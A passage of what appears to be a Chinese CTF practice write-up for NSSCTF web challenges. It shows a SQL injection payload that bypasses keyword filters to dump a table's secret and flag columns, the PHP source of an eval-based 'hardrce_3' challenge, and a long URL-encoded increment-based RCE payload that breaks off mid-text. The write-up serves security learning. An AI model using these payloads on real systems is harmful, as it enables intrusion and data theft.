<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">nss<span class="token operator">=</span><span class="token number">0</span>'uniunionon<span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment">/**/</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">/**/</span><span class="token keyword">where</span><span class="token comment">/**/</span>table_name<span class="token operator">=</span><span class="token string">"NSS_tb"</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到列名id,Secr3t,flll444g</p>
<p>爆字段（<del>哼，想骗我，不要紧，两个我都一样的查啊</del>）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">nss<span class="token operator">=</span><span class="token number">0</span><span class="token string">'uniunionon/**/select/**/1,2,(select/**/group_concat(Secr3t,'</span><span class="token operator">|</span>'<span class="token punctuation">,</span>flll444g<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>NSS_tb<span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231019221622738.png" alt="image-20231019221622738"></p>
<hr>
<h1 id="SWPUCTF-2021-新生赛-hardrce-3"><a href="#SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3"></a>[SWPUCTF 2021 新生赛]hardrce_3</h1><blockquote>
<p>自增rce+绕过disable_functions</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'wllm'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$wllm</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'wllm'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\~'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\|'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"小伙子只会异或和取反？不好意思哦LTLT说不能用！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Ra'sAlGhul说用字母数字是没有灵魂的！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"NoVic4说：不错哦小伙子，可你能拿到flag吗？"</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"蔡总说：注意审题！！！"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不让用字母数字，还不让用自增异或，那就用自增，payload用上面HowToGetShell的就行</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>wllm<span class="token operator">=</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>B<span class="token string single-quoted-string">'!'</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">3</span>D<span class="token string single-quoted-string">'%40'</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>D<span class="token string single-quoted-string">'_'</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span 